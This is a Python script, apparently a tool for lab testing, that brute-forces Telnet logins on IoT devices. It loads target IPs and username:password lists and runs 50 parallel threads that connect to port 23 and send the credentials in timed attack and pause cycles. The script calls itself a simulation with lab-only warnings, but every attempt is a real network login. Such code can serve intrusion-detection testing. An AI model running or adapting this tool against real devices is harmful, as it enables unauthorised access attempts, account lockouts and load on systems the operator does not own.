#!/usr/bin/env python3
"""
IoT Telnet Brute-Force Cycler - Simplified Version
Simple parallel brute-force attack simulation with automatic start
Educational tool for controlled lab environments only
"""

import telnetlib
import threading
import time
import json
import signal
import sys
from datetime import datetime, timedelta
import argparse
from concurrent.futures import ThreadPoolExecutor
import random
import queue

class SimpleBruteForceCycler:
    def __init__(self):
        self.target_ips = []
        self.credentials = []  # List of (username, password) tuples
        self.stop_attack = False
        self.attack_threads = []
        self.current_cycle = 0
        self.total_cycles = 6
        self.attack_duration = 300  # 5 minutes in seconds
        self.pause_duration = 120   # 2 minutes in seconds
        self.max_workers = 50       # Number of parallel brute-force threads
        self.attempt_delay = 0.1    # Delay between attempts (seconds)
        self.attack_stats = {
            'total_attempts': 0,
            'failed_attempts': 0,
            'connection_errors': 0,
            'successful_connections': 0
        }
        
    def load_target_ips_from_file(self, filename):
        """Load target IPs from JSON file"""
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
                # Support both simple list of IPs or list of objects with IP field
                for item in data:
                    if isinstance(item, str):
                        self.target_ips.append(item)
                    elif isinstance(item, dict) and 'ip' in item:
                        self.target_ips.append(item['ip'])
            print(f"[INFO] Loaded {len(self.target_ips)} target IPs from {filename}")
        except FileNotFoundError:
            print(f"[ERROR] File {filename} not found")
            return False
        except json.JSONDecodeError:
            print(f"[ERROR] Invalid JSON format in {filename}")
            return False
        except Exception as e:
            print(f"[ERROR] Error loading target IPs: {e}")
            return False
        return True
    
    def load_credentials_from_file(self, filename):
        """Load credentials from combined text file (username:password format)"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if line and ':' in line:
                        # Split only on the first colon to handle passwords with colons
                        username, password = line.split(':', 1)
                        self.credentials.append((username.strip(), password.strip()))
                    elif line and not line.startswith('#'):  # Skip comments
                        print(f"[WARNING] Invalid format on line {line_num}: {line}")
            
            print(f"[INFO] Loaded {len(self.credentials)} credential pairs from {filename}")
            return True
        except FileNotFoundError:
            print(f"[ERROR] Credentials file {filename} not found")
            return False
        except Exception as e:
            print(f"[ERROR] Error loading credentials: {e}")
            return False
    
    def attempt_telnet_login(self, ip, username, password, cycle_num):
        """Attempt a single Telnet login (simulation - no actual success needed)"""
        if self.stop_attack:
            return
            
        try:
            self.attack_stats['total_attempts'] += 1
            
            # Connect to telnet
            tn = telnetlib.Telnet(ip, 23, timeout=5)
            
            # Read banner
            try:
                banner = tn.read_until(b"login:", timeout=3)
                self.attack_stats['successful_connections'] += 1
            except:
                pass
            
            # Send username
            tn.write(username.encode('ascii') + b"\n")
            
            # Wait for password prompt
            try:
                tn.read_until(b"Password:", timeout=3)
            except:
                pass
            
            # Send password
            tn.write(password.encode('ascii') + b"\n")
            
            # Read response (we don't care about success, just simulating)
            try:
                response = tn.read_until(b"#", timeout=3)
                if b"#" not in response:
                    tn.read_until(b"$", timeout=2)
            except:
                pass
            
            tn.close()
            
            # Always count as failed since we're just simulating
            self.attack_stats['failed_attempts'] += 1
            
            # Random delay to simulate realistic brute-force timing
            if self.attempt_delay > 0:
                time.sleep(self.attempt_delay + random.uniform(0, 0.1))
                
        except Exception as e:
            self.attack_stats['connection_errors'] += 1
            # Don't print individual connection errors to avoid spam
    
    def parallel_bruteforce_worker(self, target_queue, cycle_num):
        """Worker function for parallel brute-force attacks"""
        while not self.stop_attack and not target_queue.empty():
            try:
                ip = target_queue.get_nowait()
                
                # Shuffle credentials for each IP to simulate realistic attack
                credentials = self.credentials.copy()
                random.shuffle(credentials)
                
                # Try combinations until stopped
                for username, password in credentials:
                    if self.stop_attack:
                        break
                    self.attempt_telnet_login(ip, username, password, cycle_num)
                        
                target_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                continue
    
    def run_bruteforce_cycle(self):
        """Run the complete brute-force cycling attack"""
        if not self.target_ips:
            print("[ERROR] No target IPs configured")
            return
            
        if not self.credentials:
            print("[ERROR] No credentials loaded")
            return
        
        print(f"\n[BRUTEFORCE CYCLER] Starting cyclic brute-force attack")
        print(f"[INFO] Targets: {len(self.target_ips)} IPs")
        print(f"[INFO] Credentials: {len(self.credentials)} username:password pairs")
        print(f"[INFO] Pattern: {self.attack_duration//60}min attack, {self.pause_duration//60}min pause")
        print(f"[INFO] Total cycles: {self.total_cycles}")
        print(f"[INFO] Parallel workers: {self.max_workers}")
        total_time = (self.attack_duration + self.pause_duration) * self.total_cycles
        print(f"[INFO] Total duration: {total_time//60} minutes")
        
        start_time = datetime.now()
        estimated_end = start_time + timedelta(seconds=total_time)
        print(f"[INFO] Start time: {start_time.strftime('%H:%M:%S')}")
        print(f"[INFO] Estimated end time: {estimated_end.strftime('%H:%M:%S')}")
        
        # Show target IPs
        print("[INFO] Target IPs:", ', '.join(self.target_ips[:5]) + ('...' if len(self.target_ips) > 5 else ''))
        
        # Auto-start after 3 seconds
        print("\n[WARNING] Starting parallel brute-force attack simulation in 3 seconds...")
        print("[INFO] Press Ctrl+C to stop at any time")
        time.sleep(3)
        
        try:
            for cycle in range(1, self.total_cycles + 1):
                if self.stop_attack:
                    break
                    
                self.current_cycle = cycle
                print(f"\n{'='*60}")
                print(f"CYCLE {cycle}/{self.total_cycles} - ATTACK PHASE")
                print(f"{'='*60}")
                
                # Reset stats for this cycle
                cycle_start_stats = self.attack_stats.copy()
                
                # Create queue with target IPs for this cycle
                target_queue = queue.Queue()
                for ip in self.target_ips:
                    target_queue.put(ip)
                
                # Start parallel brute-force threads
                self.attack_threads = []
                with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                    # Submit worker tasks
                    futures = []
                    for _ in range(self.max_workers):
                        future = executor.submit(self.parallel_bruteforce_worker, target_queue, cycle)
                        futures.append(future)
                    
                    # Monitor attack phase
                    attack_start = time.time()
                    last_stats_time = attack_start
                    
                    while (time.time() - attack_start) < self.attack_duration and not self.stop_attack:
                        current_time = time.time()
                        remaining = self.attack_duration - (current_time - attack_start)
                        
                        # Print stats every 10 seconds
                        if current_time - last_stats_time >= 10:
                            cycle_attempts = self.attack_stats['total_attempts'] - cycle_start_stats['total_attempts']
                            cycle_errors = self.attack_stats['connection_errors'] - cycle_start_stats['connection_errors']
                            rate = cycle_attempts / (current_time - attack_start) if current_time > attack_start else 0
                            
                            print(f"[CYCLE {cycle}] Attack phase - {remaining:.0f}s remaining | "
                                  f"Attempts: {cycle_attempts} | Errors: {cycle_errors} | Rate: {rate:.1f}/s")
                            last_stats_time = current_time
                        
                        time.sleep(1)
                    
                    # Stop current attack
                    self.stop_attack = True
                    print(f"\n[CYCLE {cycle}] Stopping attack phase...")
                    
                    # Wait for workers to finish (with timeout)
                    for future in futures:
                        try:
                            future.result(timeout=5)
                        except:
                            pass
                
                # Print cycle summary
                cycle_attempts = self.attack_stats['total_attempts'] - cycle_start_stats['total_attempts']
                cycle_errors = self.attack_stats['connection_errors'] - cycle_start_stats['connection_errors']
                cycle_connections = self.attack_stats['successful_connections'] - cycle_start_stats['successful_connections']
                
                print(f"[CYCLE {cycle}] Attack Summary:")
                print(f"  - Total attempts: {cycle_attempts}")
                print(f"  - Successful connections: {cycle_connections}")
                print(f"  - Connection errors: {cycle_errors}")
                print(f"  - Targets attacked: {len(self.target_ips)}")
                
                # Reset stop flag for next cycle
                self.stop_attack = False
                
                # Pause phase (unless it's the last cycle)
                if cycle < self.total_cycles:
                    print(f"\n{'='*60}")
                    print(f"CYCLE {cycle}/{self.total_cycles} - PAUSE PHASE")
                    print(f"{'='*60}")
                    
                    pause_start = time.time()
                    while (time.time() - pause_start) < self.pause_duration and not self.stop_attack:
                        remaining = self.pause_duration - (time.time() - pause_start)
                        print(f"[CYCLE {cycle}] Pause phase - {remaining:.0f}s remaining")
                        time.sleep(10)  # Update every 10 seconds
        
        except KeyboardInterrupt:
            print("\n[STOP] Attack interrupted by user")
            self.stop_attack = True
        
        end_time = datetime.now()
        duration = end_time - start_time
        print(f"\n{'='*60}")
        print(f"BRUTEFORCE CYCLING COMPLETED")
        print(f"{'='*60}")
        print(f"[INFO] End time: {end_time.strftime('%H:%M:%S')}")
        print(f"[INFO] Total duration: {duration}")
        print(f"[INFO] Cycles completed: {self.current_cycle}")
        print(f"\n[STATS] Final Attack Statistics:")
        print(f"  - Total login attempts: {self.attack_stats['total_attempts']}")
        print(f"  - Successful connections: {self.attack_stats['successful_connections']}")
        print(f"  - Failed attempts: {self.attack_stats['failed_attempts']}")
        print(f"  - Connection errors: {self.attack_stats['connection_errors']}")
        if duration.total_seconds() > 0:
            rate = self.attack_stats['total_attempts'] / duration.total_seconds()
            print(f"  - Average rate: {rate:.2f} attempts/second")
        print(f"[INFO] All brute-force attacks stopped")

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print('\n[STOP] Stopping all brute-force attacks...')
    global brute_cycler
    if 'brute_cycler' in globals():
        brute_cycler.stop_attack = True
    sys.exit(0)

def create_default_files():
    """Create default configuration files if they don't exist"""
    
    # Create default targets file
    targets_file = 'bruteforce_targets.json'
    try:
        with open(targets_file, 'r') as f:
            pass  # File exists
    except FileNotFoundError:
        default_targets = [
            {"ip": "11.10.10.1"},
            {"ip": "11.10.10.10"},
            {"ip": "11.10.10.11"}
        ]
        with open(targets_file, 'w') as f:
            json.dump(default_targets, f, indent=2)
        print(f"[INFO] Created default {targets_file}")

def main():
    global brute_cycler
    
    # Set up signal handler for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = argparse.ArgumentParser(description='IoT Telnet Brute-Force Cycler - Simple Auto-Start Version')
    parser.add_argument('--targets', help='JSON file containing target IPs', default='bruteforce_targets.json')
    parser.add_argument('--credentials', help='Credentials file (username:password format)', default='credentials_combined.txt')
    parser.add_argument('--attack-time', type=int, default=5, help='Attack duration in minutes (default: 5)')
    parser.add_argument('--pause-time', type=int, default=2, help='Pause duration in minutes (default: 2)')
    parser.add_argument('--cycles', type=int, default=6, help='Number of cycles (default: 6)')
    parser.add_argument('--workers', type=int, default=50, help='Number of parallel workers (default: 50)')
    parser.add_argument('--add-target', help='Add a single target IP (will be added to targets file)')
    
    args = parser.parse_args()
    
    brute_cycler = SimpleBruteForceCycler()
    
    # Configure timing from arguments
    brute_cycler.attack_duration = args.attack_time * 60
    brute_cycler.pause_duration = args.pause_time * 60
    brute_cycler.total_cycles = args.cycles
    brute_cycler.max_workers = args.workers
    
    print("IoT Telnet Brute-Force Cycler - Simple Auto-Start Version")
    print("="*60)
    print("⚠️  WARNING: Use only in controlled lab environments!")
    print("⚠️  This tool simulates brute-force attacks for testing!")
    print("⚠️  Never use against systems you don't own!")
    print("="*60)
    
    # Create default files
    create_default_files()
    
    # Load credentials
    if not brute_cycler.load_credentials_from_file(args.credentials):
        print(f"[ERROR] Cannot proceed without credentials file: {args.credentials}")
        print("[INFO] Please ensure the credentials file exists with username:password format")
        return
    
    # Load targets from file
    if not brute_cycler.load_target_ips_from_file(args.targets):
        print(f"[ERROR] Cannot proceed without targets file: {args.targets}")
        print("[INFO] Please ensure the targets file exists with JSON format")
        return
    
    # Add single target if specified
    if args.add_target:
        brute_cycler.target_ips.append(args.add_target)
        print(f"[INFO] Added additional target: {args.add_target}")
    
    # Validate we have everything needed
    if not brute_cycler.target_ips:
        print("[ERROR] No target IPs loaded. Please check your targets file or use --add-target")
        return
    
    if not brute_cycler.credentials:
        print("[ERROR] No credentials loaded. Please check your credentials file")
        return
    
    # Run the attack immediately
    brute_cycler.run_bruteforce_cycle()

if __name__ == "__main__":
    main()
